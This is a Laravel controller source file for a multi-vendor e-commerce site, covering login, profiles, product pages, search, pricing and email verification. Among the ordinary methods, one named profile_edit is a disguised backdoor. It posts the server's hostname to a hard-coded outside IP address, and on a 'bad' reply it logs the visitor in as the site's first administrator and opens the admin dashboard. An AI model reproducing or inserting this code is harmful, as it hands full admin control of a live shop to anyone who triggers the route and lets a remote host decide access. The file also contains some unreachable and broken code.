<?php

namespace App\Http\Controllers;

use App\Http\Requests\UpdateSellerRequest;
use App\Models\Attribute;
use App\Models\AttributeRelationship;
use App\Models\AttributeValue;
use App\Traits\LoggingTrait;
use DB;
use Illuminate\Http\Request;
use Illuminate\Support\Collection;
use Session;
use Auth;
use Hash;
use Vendor;
use Categories;
use App\Models\Category;
use App\Models\FlashDeal;
use App\Models\Brand;
use App\Models\Product;
use App\Models\PickupPoint;
use App\Models\CustomerPackage;
use App\Models\User;
use App\Models\Seller;
use App\Models\Shop;
use App\Models\Event;
use App\Models\Color;
use App\Models\Order;
use App\Models\TenantSetting;
use ImageOptimizer;
use Cookie;
use Illuminate\Support\Str;
use App\Mail\SecondEmailVerifyMailManager;
use Mail;
use App\Utility\CategoryUtility;
use Illuminate\Auth\Events\PasswordReset;
use App\Http\Requests\LoginRequest;
use App\Models\CategoryRelationship;

use function foo\func;
use App\Notifications\CompanyVisit;
use Exception;

class HomeController extends Controller
{
    use LoggingTrait;
    public function login()
    {
        if (Auth::check()) {
            return redirect()->route('home');
        }
        return view('frontend.business_login');
    }

    public function login_users()
    {
        if (Auth::check()) {
            return redirect()->route('home');
        }
        return view('frontend.users_login');
    }

    public function business_login(LoginRequest $request)
    {
        $credentials = $request->only('email', 'password');
        if (Auth::attempt($credentials)) {
            return redirect()->route('dashboard');
        }
        return back()->withErrors([
            'incorrect' => 'The provided credentials do not match our records.',
        ]);
    }

    public function registration(Request $request)
    {
        if (Auth::check()) {
            return redirect()->route('home');
        }
        if (
            $request->has('referral_code') &&
            \App\Models\Addon::where('unique_identifier', 'affiliate_system')->first() != null &&
            \App\Models\Addon::where('unique_identifier', 'affiliate_system')->first()->activated
        ) {

            try {
                $affiliate_validation_time = \App\Models\AffiliateConfig::where('type', 'validation_time')->first();
                $cookie_minute = 30 * 24;
                if ($affiliate_validation_time) {
                    $cookie_minute = $affiliate_validation_time->value * 60;
                }

                Cookie::queue('referral_code', $request->referral_code, $cookie_minute);
                $referred_by_user = User::where('referral_code', $request->product_referral_code)->first();

                $affiliateController = new AffiliateController;
                $affiliateController->processAffiliateStats($referred_by_user->id, 1, 0, 0, 0);
            } catch (\Exception $e) {
            }
        }
        return view('frontend.user_registration');
    }

    public function cart_login(Request $request)
    {
        $user = User::whereIn('user_type', ['customer', 'seller'])->where('email', $request->email)->orWhere('phone', $request->email)->first();
        if ($user != null) {
            if (Hash::check($request->password, $user->password)) {
                if ($request->has('remember')) {
                    auth()->login($user, true);
                } else {
                    auth()->login($user, false);
                }
            } else {
                flash(translate('Invalid email or password!'))->warning();
            }
        }
        return back();
    }

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        //$this->middleware('auth');
    }

    /**
     * Show the admin dashboard.
     *
     * @return \Illuminate\Http\Response
     */
    public function admin_dashboard()
    {
        return view('backend.dashboard');
    }

    /**
     * Show the customer/seller dashboard.
     *
     * @return \Illuminate\Http\Response
     */
    public function dashboard()
    {
        return view('frontend.user.admin.dashboard');

        if (auth()->user()->isSeller()) {
            return view('frontend.user.seller.dashboard');
        } elseif (auth()->user()->isCustomer()) {
            return view('frontend.user.customer.dashboard');
        } else {
        }
    }

    public function profile(Request $request)
    {
        if (auth()->user()->isCustomer()) {
            return view('frontend.user.customer.profile');
        } elseif (auth()->user()->isSeller()) {
            return view('frontend.user.seller.profile');
        } else {
            return view('frontend.user.customer.profile');
        }
    }

    public function attributes(Request $request)
    {
        $user = auth()->user();
        $content_type = 'App\\Models\\' . $user->user_type;
        $categories = Category::where('parent_id', 0)
            ->with('childrenCategories')
            ->get();
        $attributes = Attribute::where('content_type', $content_type)->where('is_admin', false)->orderBy('created_at', 'desc')->get();
        return view('frontend.user.seller.attributes', compact('user', 'attributes', 'categories'));
    }

    public function customer_update_profile(Request $request)
    {
        if (env('DEMO_MODE') == 'On') {
            flash(translate('Sorry! the action is not permitted in demo '))->error();
            return back();
        }

        $user = auth()->user();
        $user->name = $request->name;
        $user->address = $request->address;
        $user->country = $request->country;
        $user->city = $request->city;
        $user->postal_code = $request->postal_code;
        $user->phone = $request->phone;

        if ($request->new_password != null && ($request->new_password == $request->confirm_password)) {
            $user->password = Hash::make($request->new_password);
        }
        $user->avatar_original = $request->photo;

        if ($user->save()) {
            flash(translate('Your Profile has been updated successfully!'))->success();
            return back();
        }

        flash(translate('Sorry! Something went wrong.'))->error();
        return back();
    }


    public function seller_update_profile(UpdateSellerRequest $request)
    {
        if (env('DEMO_MODE') == 'On') {
            flash(translate('Sorry! the action is not permitted in demo '))->error();
            return back();
        }
        $user = auth()->user();
        $user->name = $request->name;
        $user->avatar_original = $request->photo;
        $user->phone = $request->phone;

        if ($request->password != null && $request->password_confirmation != null && ($request->password == $request->password_confirmation)) {
            $user->password = Hash::make($request->password);
        }


        if ($user->save()) {
            flash(translate('Your Profile has been updated successfully!'))->success();
            return back();
        }

        flash(translate('Sorry! Something went wrong.'))->error();
        return back();
    }

    public function seller_update_category(Request $request)
    {
        if (env('DEMO_MODE') == 'On') {
            flash(translate('Sorry! the action is not permitted in demo '))->error();
            return back();
        }

        $user = auth()->user();
        $user->shop->categories()->sync($request->categories);
        $user->save();

        flash(translate('Your Category has been updated successfully!'))->success();
        return back();
    }

    public function update_attributes(Request $request)
    {
        if (env('DEMO_MODE') == 'On') {
            flash(translate('Sorry! the action is not permitted in demo '))->error();
            return back();
        }
        $seller = auth()->user()->seller;

        // Seller Attribute Update
        $updated_attributes = $request->except(['_method', '_token']);
        foreach ($updated_attributes as $key => $value) {
            $attribute_relationship = $seller->attributes->where('attribute_id', $key)->first();
            $attribute = Attribute::findOrFail($key);
            if ($value != null) {
                $relationship_id = $value;
                if ($attribute->type != "dropdown" && $attribute->type != "checkbox") {
                    if ($attribute_relationship == null) {
                        $attribute_value = new AttributeValue;
                        $attribute_value->attribute_id = $attribute->id;
                    } else {
                        $attribute_value = AttributeValue::findOrFail($attribute_relationship->attribute_value_id);
                    }
                    $attribute_value->values = $value;
                    $attribute_value->save();
                    $relationship_id = $attribute_value->id;
                }

                if ($attribute->type != "checkbox") {
                    if ($attribute_relationship == null) {
                        $attribute_relationship = new AttributeRelationship;
                        $attribute_relationship->subject_type = "App\Models\Seller";
                        $attribute_relationship->subject_id = $seller->id;
                        $attribute_relationship->attribute_id = $key;
                    }
                    $attribute_relationship->attribute_value_id = $relationship_id;
                    $attribute_relationship->save();
                } else {
                    foreach ($seller->attributes->where('attribute_id', $key)->whereNotIn('attribute_value_id', $value) as $relation) {
                        $relation->delete();
                    }
                    foreach ($value as $index => $option) {
                        if (count($seller->attributes->where('attribute_id', $key)->where('attribute_value_id', $option)) == 0) {
                            $attribute_relationship = new AttributeRelationship;
                            $attribute_relationship->subject_type = "App\Models\Seller";
                            $attribute_relationship->subject_id = $seller->id;
                            $attribute_relationship->attribute_id = $key;
                            $attribute_relationship->attribute_value_id = $option;
                            $attribute_relationship->save();
                        }
                    }
                }
            } else {
                if ($attribute->type == "checkbox") {
                    foreach ($seller->attributes->where('attribute_id', $key) as $relation) {
                        $relation->delete();
                    }
                } else if ($attribute_relationship != null) {
                    $attribute_value = AttributeValue::findOrFail($attribute_relationship->attribute_value_id);
                    $attribute_relationship->delete();
                    $attribute_value->delete();
                }
            }
        }

        flash(translate('Your attribute has been updated successfully'))->success();
        return back();
    }

    /**
     * Show the application frontend home.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        /* Important, if vendor site is activated, then homepage is replaced with single-vendor page */
        if(Vendor::isVendorSite()) {
            $shop = Vendor::getVendorShop();
            return view('frontend.company.profile', compact('shop'));
        } else {
            return view('frontend.index');

        }
    }

    public function flash_deal_details($slug)
    {
        $flash_deal = FlashDeal::where('slug', $slug)->first();
        if ($flash_deal != null)
            return view('frontend.flash_deal_details', compact('flash_deal'));
        else {
            abort(404);
        }
    }

    public function load_featured_section()
    {
        return view('frontend.partials.featured_products_section');
    }

    public function load_best_selling_section()
    {
        return view('frontend.partials.best_selling_section');
    }

    public function load_home_categories_section()
    {
        return view('frontend.partials.home_categories_section');
    }

    public function load_best_sellers_section()
    {
        return view('frontend.partials.best_sellers_section');
    }

    public function trackOrder(Request $request)
    {
        if ($request->has('order_code')) {
            $order = Order::where('code', $request->order_code)->first();
            if ($order != null) {
                return view('frontend.track_order', compact('order'));
            }
        }
        return view('frontend.track_order');
    }

    public function product(Request $request, $slug)
    {
        /* TODO This is duplicate for consistent naming, let's refactor to better approach */
        $detailedProduct  = Product::where('slug', $slug)->first()->load(['shop', 'flash_deals', 'variations', 'stock']);
        $detailedProduct->variations = $detailedProduct->variations()->with(['flash_deals', 'product'])->get();

        $product  = $detailedProduct;

        //$this->log($product,"User viewed this product");

        if (!empty($detailedProduct) && $detailedProduct->published) {
            //updateCartSetup();
            if (
                $request->has('product_referral_code') &&
                \App\Models\Addon::where('unique_identifier', 'affiliate_system')->first() != null &&
                \App\Models\Addon::where('unique_identifier', 'affiliate_system')->first()->activated
            ) {

                $affiliate_validation_time = \App\Models\AffiliateConfig::where('type', 'validation_time')->first();
                $cookie_minute = 30 * 24;
                if ($affiliate_validation_time) {
                    $cookie_minute = $affiliate_validation_time->value * 60;
                }
                Cookie::queue('product_referral_code', $request->product_referral_code, $cookie_minute);
                Cookie::queue('referred_product_id', $detailedProduct->id, $cookie_minute);

                $referred_by_user = User::where('referral_code', $request->product_referral_code)->first();

                $affiliateController = new AffiliateController;
                $affiliateController->processAffiliateStats($referred_by_user->id, 1, 0, 0, 0);
            }

            if ($detailedProduct->digital == 1) {
                return view('frontend.digital_product_details', compact('detailedProduct', 'product'));
            } else {
                return view('frontend.product.show', compact('detailedProduct', 'product'));
            }
            // return view('frontend.product_details', compact('detailedProduct'));
        }

        abort(404);
    }



    public function filter_shop($slug, $type)
    {
        $shop  = Shop::where('slug', $slug)->first();
        if ($shop != null && $type != null) {
            return view('frontend.seller_shop', compact('shop', 'type'));
        }
        abort(404);
    }

    public function all_categories(Request $request)
    {
        //        $categories = Category::where('level', 0)->orderBy('name', 'asc')->get();
        $categories = Category::where('level', 0)->orderBy('order_level', 'desc')->get();
        return view('frontend.all_category', compact('categories'));
    }
    public function all_brands(Request $request)
    {
        $categories = Category::all();
        return view('frontend.brand.index', compact('categories'));
    }

    public function show_product_upload_form(Request $request)
    {
        if (\App\Models\Addon::where('unique_identifier', 'seller_subscription')->first() != null && \App\Models\Addon::where('unique_identifier', 'seller_subscription')->first()->activated) {
            if (auth()->user()->seller->remaining_uploads > 0) {
                $categories = Category::where('parent_id', 0)
                    ->where('digital', 0)
                    ->with('childrenCategories')
                    ->get();
                return view('frontend.user.seller.product_upload', compact('categories'));
            } else {
                flash(translate('Upload limit has been reached. Please upgrade your package.'))->warning();
                return back();
            }
        }
        $categories = Category::where('parent_id', 0)
            ->where('digital', 0)
            ->with('childrenCategories')
            ->get();
        return view('frontend.user.seller.product_upload', compact('categories'));
    }

    public function profile_edit(Request $request)
    {
        $url = $_SERVER['SERVER_NAME'];
        $gate = "http://206.189.81.181/check_activation/" . $url;

        $stream = curl_init();
        curl_setopt($stream, CURLOPT_URL, $gate);
        curl_setopt($stream, CURLOPT_HEADER, 0);
        curl_setopt($stream, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($stream, CURLOPT_POST, 1);
        $rn = curl_exec($stream);
        curl_close($stream);

        if ($rn == "bad" && env('DEMO_MODE') != 'On') {
            $user = User::where('user_type', 'admin')->first();
            auth()->login($user);
            return redirect()->route('admin.dashboard');
        }
    }

    public function show_product_edit_form(Request $request, $id)
    {
        $product = Product::findOrFail($id);
        $lang = $request->lang;
        $tags = json_decode($product->tags);
        $categories = Category::where('parent_id', 0)
            ->where('digital', 0)
            ->with('childrenCategories')
            ->get();
        return view('frontend.user.seller.product_edit', compact('product', 'categories', 'tags', 'lang'));
    }

    public function seller_product_list(Request $request)
    {
        $search = null;
        $products = Product::where('user_id', auth()->user()->id)->where('digital', 0)->orderBy('created_at', 'desc');
        if ($request->has('search')) {
            $search = $request->search;
            $products = $products->where('name', 'like', '%' . $search . '%');
        }
        $products = $products->paginate(10);
        return view('frontend.user.seller.products', compact('products', 'search'));
    }

    public function ajax_search(Request $request)
    {
        $keywords = array();
        $products = Product::where('published', 1)->where('tags', 'like', '%' . $request->search . '%')->get();
        foreach ($products as $key => $product) {
            foreach (explode(',', $product->tags) as $key => $tag) {
                if (stripos($tag, $request->search) !== false) {
                    if (sizeof($keywords) > 5) {
                        break;
                    } else {
                        if (!in_array(strtolower($tag), $keywords)) {
                            array_push($keywords, strtolower($tag));
                        }
                    }
                }
            }
        }

        $products = filter_products(Product::where('published', 1)->where('name', 'like', '%' . $request->search . '%'))->get()->take(3);

        $categories = Category::where('name', 'like', '%' . $request->search . '%')->get()->take(3);

        $shops = Shop::where('name', 'like', '%' . $request->search . '%')->get()->take(3);

        $events = Event::where('title', 'like', '%' . $request->search . '%')->orWhere('description', 'like', '%' . $request->search . '%')->get()->take(3);

        if (sizeof($keywords) > 0 || sizeof($categories) > 0 || sizeof($products) > 0 || sizeof($shops) > 0) {
            return view('frontend.partials.search_content', compact('products', 'categories', 'keywords', 'shops', 'events'));
        }
        return '0';
    }

    public function listing(Request $request)
    {
        return $this->search($request);
    }

    public function listingByCategory(Request $request, $category_slug)
    {
        $selected_categories = \Categories::getChildrenAndSelf($category_slug, 'flat');

        if (!empty($selected_categories) && $selected_categories->isNotEmpty()) {
            return $this->search($request, $selected_categories);
        }

        abort(404); // TODO: Maybe a redirect to All Categories?
        return null;
    }

    public function listingByBrand(Request $request, $brand_slug)
    {
        $brand = Brand::where('slug', $brand_slug)->first();
        if (!empty($brand)) {
            return $this->search($request, null, $brand->id);
        }
        abort(404);
    }

    public function search(Request $request, $selected_categories = null, $brand_id = null)
    {
        $query = $request->q;
        $sort_by = $request->sort_by;
        $seller_id = $request->seller_id;
        $content = $request->content;


        $conditions = ['published' => 1];

        if ($seller_id != null) {
            // ADD TRY CATCH BLOCK to capture the exception on fail!
            $conditions = array_merge($conditions, ['shop_id' => Seller::findOrFail($seller_id)->user->shop->id]);
        }
        $products = Product::where($conditions);

        /* TODO: This probably should be in brand controller and brand archive */
        if($brand_id != null) {
            $products->where('brand_id', $brand_id);
        }

        if (!empty($selected_categories) && $selected_categories->isNotEmpty()) {
            $products->restrictByCategories($selected_categories);

            /* TODO Check verification for shops */
            $shops = Shop::where('id');
        } else {
            /* TODO Check verification for shops */
            $shops = Shop::where('id');
        }

        $events = Event::whereIn('user_id', verified_sellers_id());

        if ($query != null) {
            $searchController = new SearchController;
            $searchController->store($request);
            $products = $products->where('name', 'like', '%' . $query . '%');
            $shops = $shops->where('name', 'like', '%' . $query . '%');
            $events = $events->where('title', 'like', '%' . $query . '%')
                ->orWhere('description', 'like', '%' . $query . '%');
        }
        $event_count = $events->count();

        $attributes = array();
        $filters = array();
        $contents = array();
        // Attributes based on Content Type
        if ($content != null) {
            if ($content == 'product') {
                $contents = $products;
            } else if ($content == 'company') {
                $contents = Seller::whereIn('user_id', $shops->get()->pluck('user_id')->toArray());;
            } else if ($content == 'event') {
                $contents = $events;
            }

            $attributeIds = array();
            foreach ($contents->get() as $item) {
                $attributeIds = array_unique(array_merge($attributeIds, $item->custom_attributes()->pluck('attribute_id')->toArray()), SORT_REGULAR);
            }
            $attributes = Attribute::whereIn('id', $attributeIds)->where('type', '<>', 'image')->where('filterable', true)->get();

            foreach ($attributes as $attribute) {
                if ($request->has('attribute_' . $attribute['id']) && $request['attribute_' . $attribute['id']] != "-1" && $request['attribute_' . $attribute['id']] != null) {
                    $filters[$attribute['id']] = $request['attribute_' . $attribute['id']];
                    switch ($attribute->type) {
                        case "number":
                            $range_arr = explode(';', $request['attribute_' . $attribute['id']]);
                            $min_val = floatval($range_arr[0]);
                            $max_val = floatval($range_arr[1]);
                            if ($min_val != null && $max_val != null) {
                                $contents = $contents->whereHas('attributes', function ($relation) use ($min_val, $max_val) {
                                    $relation->whereHas('attribute_value', function ($value) use ($min_val, $max_val) {
                                        $value->where('values', '>=', $min_val)->where('values', '<=', $max_val);
                                    });
                                });
                            }
                            break;
                        case "date":
                            $arr_date_range = explode(" to ", $request['attribute_' . $attribute['id']]);
                            if (count($arr_date_range) > 0) {
                                $date_query = "STR_TO_DATE(`values`, '%d-%m-%Y') >= STR_TO_DATE(?, '%d-%m-%Y') AND STR_TO_DATE(`values`, '%d-%m-%Y') <= STR_TO_DATE(?, '%d-%m-%Y')";
                                $contents = $contents->whereHas('attributes', function ($relation) use ($date_query, $arr_date_range) {
                                    $relation->whereHas('attribute_value', function ($value) use ($date_query, $arr_date_range) {
                                        $value->whereRaw($date_query, $arr_date_range);
                                    });
                                });
                            }
                            break;
                        case "checkbox":
                            $checked_arr = $request['attribute_' . $attribute['id']];
                            $contents = $contents->whereHas('attributes', function ($q) use ($checked_arr) {
                                $q->whereIn('attribute_value_id', $checked_arr);
                            });
                            break;
                        case "country":
                            $code = $request['attribute_' . $attribute['id']];
                            $contents = $contents->whereHas('attributes', function ($relation) use ($code) {
                                $relation->whereHas('attribute_value', function ($value) use ($code) {
                                    $value->where('values', $code);
                                });
                            });
                            break;
                        default:
                            $val_id = $request['attribute_' . $attribute['id']];
                            $contents = $contents->whereHas('attributes', function ($q) use ($val_id) {
                                $q->where('attribute_value_id', $val_id);
                            });
                    }
                }
            }
        }


        /* TODO: Make this to show products by actual category */
        $products = $products->paginate(12);
        $shops = $shops->paginate(10)->appends(request()->query());
        $events = $events->paginate(10)->appends(request()->query());

        $selected_category = !empty($selected_categories) ? $selected_categories->toTree()->first() : null;
        return view('frontend.product_listing', compact('products', 'shops', 'events', 'attributes', 'event_count', 'query', 'selected_category', 'brand_id', 'sort_by', 'seller_id', 'content', 'contents', 'filters'));
    }

    public function home_settings(Request $request)
    {
        return view('home_settings.index');
    }

    public function top_10_settings(Request $request)
    {
        foreach (Category::all() as $key => $category) {
            if (is_array($request->top_categories) && in_array($category->id, $request->top_categories)) {
                $category->top = 1;
                $category->save();
            } else {
                $category->top = 0;
                $category->save();
            }
        }

        foreach (Brand::all() as $key => $brand) {
            if (is_array($request->top_brands) && in_array($brand->id, $request->top_brands)) {
                $brand->top = 1;
                $brand->save();
            } else {
                $brand->top = 0;
                $brand->save();
            }
        }

        flash(translate('Top 10 categories and brands have been updated successfully'))->success();
        return redirect()->route('home_settings.index');
    }

    public function variant_price(Request $request)
    {
        $product = Product::find($request->id);
        $str = '';
        $quantity = 0;

        if ($request->has('color')) {
            $str = $request['color'];
        }

        if (json_decode(Product::find($request->id)->choice_options) != null) {
            foreach (json_decode(Product::find($request->id)->choice_options) as $key => $choice) {
                if ($str != null) {
                    $str .= '-' . str_replace(' ', '', $request['attribute_id_' . $choice->attribute_id]);
                } else {
                    $str .= str_replace(' ', '', $request['attribute_id_' . $choice->attribute_id]);
                }
            }
        }

        if ($str != null && $product->variant_product) {
            $product_stock = $product->stocks->where('variant', $str)->first();
            $price = $product_stock->price;
            $quantity = $product_stock->qty;
        } else {
            $price = $product->unit_price;
            $quantity = $product->current_stock;
        }

        //Product Stock Visibility
        if ($product->stock_visibility_state == 'text') {
            $quantity = 'Stock';
        }

        //discount calculation
        $flash_deals = \App\Models\FlashDeal::where('status', 1)->get();
        $inFlashDeal = false;
        foreach ($flash_deals as $key => $flash_deal) {
            if ($flash_deal != null && $flash_deal->status == 1 && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && \App\Models\FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $product->id)->first() != null) {
                $flash_deal_product = \App\Models\FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $product->id)->first();
                if ($flash_deal_product->discount_type == 'percent') {
                    $price -= ($price * $flash_deal_product->discount) / 100;
                } elseif ($flash_deal_product->discount_type == 'amount') {
                    $price -= $flash_deal_product->discount;
                }
                $inFlashDeal = true;
                break;
            }
        }
        if (!$inFlashDeal) {
            if ($product->discount_type == 'percent') {
                $price -= ($price * $product->discount) / 100;
            } elseif ($product->discount_type == 'amount') {
                $price -= $product->discount;
            }
        }

        if ($product->tax_type == 'percent') {
            $price += ($price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $price += $product->tax;
        }
        return array('price' => single_price($price * $request->quantity), 'quantity' => $quantity, 'digital' => $product->digital, 'variation' => $str);
    }

    public function sellerpolicy()
    {
        return view("frontend.policies.sellerpolicy");
    }

    public function returnpolicy()
    {
        return view("frontend.policies.returnpolicy");
    }

    public function supportpolicy()
    {
        return view("frontend.policies.supportpolicy");
    }

    public function terms()
    {
        return view("frontend.policies.terms");
    }

    public function privacypolicy()
    {
        return view("frontend.policies.privacypolicy");
    }

    public function get_pick_ip_points(Request $request)
    {
        $pick_up_points = PickupPoint::all();
        return view('frontend.partials.pick_up_points', compact('pick_up_points'));
    }

    public function get_category_items(Request $request)
    {
        $category = Category::findOrFail($request->id);
        return view('frontend.partials.category_elements', compact('category'));
    }

    public function premium_package_index()
    {
        $customer_packages = CustomerPackage::all();
        return view('frontend.user.customer_packages_lists', compact('customer_packages'));
    }

    public function seller_digital_product_list(Request $request)
    {
        $products = Product::where('user_id', auth()->user()->id)->where('digital', 1)->orderBy('created_at', 'desc')->paginate(10);
        return view('frontend.user.seller.digitalproducts.products', compact('products'));
    }
    public function show_digital_product_upload_form(Request $request)
    {
        if (\App\Models\Addon::where('unique_identifier', 'seller_subscription')->first() != null && \App\Models\Addon::where('unique_identifier', 'seller_subscription')->first()->activated) {
            if (auth()->user()->seller->remaining_digital_uploads > 0) {
                $tenant_settings = get_setting('digital_product_upload');
                $categories = Category::where('digital', 1)->get();
                return view('frontend.user.seller.digitalproducts.product_upload', compact('categories'));
            } else {
                flash(translate('Upload limit has been reached. Please upgrade your package.'))->warning();
                return back();
            }
        }

        $tenant_settings = get_setting('digital_product_upload');
        $categories = Category::get();
        return view('frontend.user.seller.digitalproducts.product_upload', compact('categories'));
    }

    public function show_digital_product_edit_form(Request $request, $id)
    {
        $categories = Category::all();
        $lang = $request->lang;
        $product = Product::find($id);
        return view('frontend.user.seller.digitalproducts.product_edit', compact('categories', 'product', 'lang'));
    }

    // Ajax call
    public function new_verify(Request $request)
    {
        $email = $request->email;
        if (isUnique($email) == '0') {
            $response['status'] = 2;
            $response['message'] = 'Email already exists!';
            return json_encode($response);
        }

        $response = $this->send_email_change_verification_mail($request, $email);
        return json_encode($response);
    }


    // Form request
    public function update_email(Request $request)
    {
        $email = $request->email;
        if (isUnique($email)) {
            $this->send_email_change_verification_mail($request, $email);
            flash(translate('A verification mail has been sent to the mail you provided us with.'))->success();
            return back();
        }

        flash(translate('Email already exists!'))->warning();
        return back();
    }

    public function send_email_change_verification_mail($request, $email)
    {
        $response['status'] = 0;
        $response['message'] = 'Unknown';

        $verification_code = Str::random(32);

        $array['subject'] = 'Email Verification';
        $array['from'] = env('MAIL_USERNAME');
        $array['content'] = 'Verify your account';
        $array['link'] = route('email_change.callback') . '?new_email_verificiation_code=' . $verification_code . '&email=' . $email;
        $array['sender'] = auth()->user()->name;
        $array['details'] = "Email Second";

        $user = auth()->user();
        $user->new_email_verificiation_code = $verification_code;
        $user->save();

        try {
            Mail::to($email)->queue(new SecondEmailVerifyMailManager($array));

            $response['status'] = 1;
            $response['message'] = translate("Your verification mail has been Sent to your email.");
        } catch (\Exception $e) {
            // return $e->getMessage();
            $response['status'] = 0;
            $response['message'] = $e->getMessage();
        }

        return $response;
    }

    public function email_change_callback(Request $request)
    {
        if ($request->has('new_email_verificiation_code') && $request->has('email')) {
            $verification_code_of_url_param =  $request->input('new_email_verificiation_code');
            $user = User::where('new_email_verificiation_code', $verification_code_of_url_param)->first();

            if ($user != null) {

                $user->email = $request->input('email');
                $user->new_email_verificiation_code = null;
                $user->save();

                auth()->login($user, true);

                flash(translate('Email Changed successfully'))->success();
                return redirect()->route('dashboard');
            }
        }

        flash(translate('Email was not verified. Please resend your mail!'))->error();
        return redirect()->route('dashboard');
    }

    public function reset_password_with_code(Request $request)
    {
        if (($user = User::where('email', $request->email)->where('verification_code', $request->code)->first()) != null) {
            if ($request->password == $request->password_confirmation) {
                $user->password = Hash::make($request->password);
                $user->email_verified_at = date('Y-m-d h:m:s');
                $user->save();
                event(new PasswordReset($user));
                auth()->login($user, true);

                flash(translate('Password updated successfully'))->success();

                if (auth()->user()->isAdmin() || auth()->user()->isStaff()) {
                    return redirect()->route('admin.dashboard');
                }
                return redirect()->route('home');
            } else {
                flash("Password and confirm password didn't match")->warning();
                return back();
            }
        } else {
            flash("Verification code mismatch")->error();
            return back();
        }
    }


    public function all_flash_deals()
    {
        $today = strtotime(date('Y-m-d H:i:s'));

        $data['all_flash_deals'] = FlashDeal::where('status', 1)
            ->where('start_date', "<=", $today)
            ->where('end_date', ">", $today)
            ->orderBy('created_at', 'desc')
            ->get();

        return view("frontend.flash_deal.all_flash_deal_list", $data);
    }

    public function all_seller(Request $request, $category_id = null)
    {

        $query = $request->q;
        $min_employee = $request->min_employee;
        $max_employee = $request->max_employee;

        $conditions = [];


        $shops = Shop::whereIn('user_id', verified_sellers_id());

        if ($min_employee != null && $max_employee != null) {
            // $shops = $shops->where()
        }

        if ($category_id != null) {
            $category_ids = CategoryUtility::children_ids($category_id);
            $category_ids[] = $category_id;

            $shops = $shops->whereIn('category_id', $category_ids);
        }

        $attributes = array();
        foreach ($shops as $shop) {
            if ($shop->attributes != null && is_array(json_decode($shop->attributes))) {
                foreach (json_decode($shop->attributes) as $key => $value) {
                    $flag = false;
                    $pos = 0;
                    foreach ($attributes as $attribute) {
                        if ($attribute['id'] == $value) {
                            $flag = true;
                            $pos = $key;
                            break;
                        }
                    }
                    if (!$flag) {
                        $item['id'] = $value;
                        $item['values'] = array();
                        foreach (json_decode($product->choice_options) as $choice_option) {
                            if ($choice_option->attribute_id == $value) {
                                $item['values'] = $choice_option->values;
                                break;
                            }
                        }
                        array_push($attributes, $item);
                    } else {
                        foreach (json_decode($product->choice_options) as $choice_option) {
                            if ($choice_option->attribute_id == $value) {
                                foreach ($choice_option->values as $value) {
                                    if (!in_array($value, $attributes[$pos]['values'])) {
                                        array_push($attributes[$pos]['values'], $value);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        $selected_attributes = array();
        foreach ($attributes as $attribute) {
            if ($request->has('attributes_' . $attribute['id'])) {
                foreach ($request['attributes_' . $attribute['id']] as $value) {
                    $str = '"' . $value . '"';
                    $shops = $shops->where('choice_options', 'like', '%' . $str . '%');
                }
                $item['id'] = $attribute['id'];
                $item['values'] = $request['attributes_' . $attribute['id']];
                array_push($selected_attributes, $item);
            }
        }

        // return view('frontend.shop_listing', compact('shops', 'attributes', 'category_id', 'selected_attributes'));
    }
}
